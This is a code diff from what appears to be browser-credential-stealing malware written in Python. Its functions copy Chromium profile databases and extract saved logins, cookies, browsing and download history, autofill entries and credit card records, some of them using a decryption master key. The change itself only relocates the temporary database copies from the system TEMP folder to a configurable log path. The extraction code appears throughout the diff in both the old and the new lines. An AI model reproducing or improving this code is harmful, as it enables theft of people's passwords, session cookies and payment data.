@@ -130,7 +130,7 @@ def get_login_data(path, master_key, blink = False):
             num = path.rfind("\\")
             profile = path[num+1:]
             logins += f"===============================\n\n\n{profile}:\n\n"
-        login_db = join(environ["TEMP"], "lwincache.db")
+        login_db = join(config.pathToLogs, "lwincache.db")
         shadow_copy(join(path, "Login Data"), login_db)
         conn = connect(login_db)
         cursor = conn.cursor()
@@ -154,7 +154,7 @@ def get_web_history(path, blink = False):
             history += f"===============================\n\n\n{profile}:\n\n"
         HistorySQL = "SELECT url FROM visits"
         HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
-        history_db = join(environ["TEMP"], "hwincache.db")
+        history_db = join(config.pathToLogs, "hwincache.db")
         copy2(join(path, "History"), history_db)
         c = connect(history_db)
         cursor = c.cursor()
@@ -179,7 +179,7 @@ def get_downloads(path, blink = False):
             num = path.rfind("\\")
             profile = path[num+1:]
             downhistory += f"===============================\n\n\n{profile}:\n\n"
-        downloads_db = join(environ["TEMP"], "dwincache.db")
+        downloads_db = join(config.pathToLogs, "dwincache.db")
         copy2(join(path, "History"), downloads_db)
         conn = connect(downloads_db)
         cursor = conn.cursor()
@@ -202,7 +202,7 @@ def get_cookies(path, master_key, blink = False):
             profile = path[num+1:]
             cookies += f"===============================\n\n\n{profile}:\n\n"
         if not exists(join(path, "Network", "Cookies")): return None
-        cookie_db = join(environ["TEMP"], "cwincache.db")
+        cookie_db = join(config.pathToLogs, "cwincache.db")
         shadow_copy(join(path, "Network", "Cookies"), cookie_db)
         conn = connect(cookie_db)
         cursor = conn.cursor()
@@ -232,8 +232,8 @@ def get_autofils(path, blink = False):
         webdata = f'{path}\\Web Data'
         if not exists(webdata): return None
 
-        copy2(webdata, join(environ["TEMP"], "wwincache.db"))
-        conn = connect(join(environ["TEMP"], "wwincache.db"))
+        copy2(webdata, join(config.pathToLogs, "wwincache.db"))
+        conn = connect(join(config.pathToLogs, "wwincache.db"))
         cursor = conn.cursor()
         cursor.execute('SELECT name, value FROM autofill')
         for row in cursor.fetchall():
@@ -241,7 +241,7 @@ def get_autofils(path, blink = False):
             autofills += str(Types.Autofill(row[0], row[1])) + "\n\n"
 
         conn.close()
-        remove(join(environ["TEMP"], "wwincache.db"))
+        remove(join(config.pathToLogs, "wwincache.db"))
     except Exception as e:
         Log(f"{path} autofils ---> {e}")
 
@@ -252,7 +252,7 @@ def get_credit_cards(path, master_key, blink = False):
             num = path.rfind("\\")
             profile = path[num+1:]
             cards += f"===============================\n\n\n{profile}:\n\n"
-        cards_db = join(environ["TEMP"], "crwincache.db")
+        cards_db = join(config.pathToLogs, "crwincache.db")
         if not exists(join(path, "Web Data")): return None
 
         copy2(join(path, "Web Data"), cards_db)
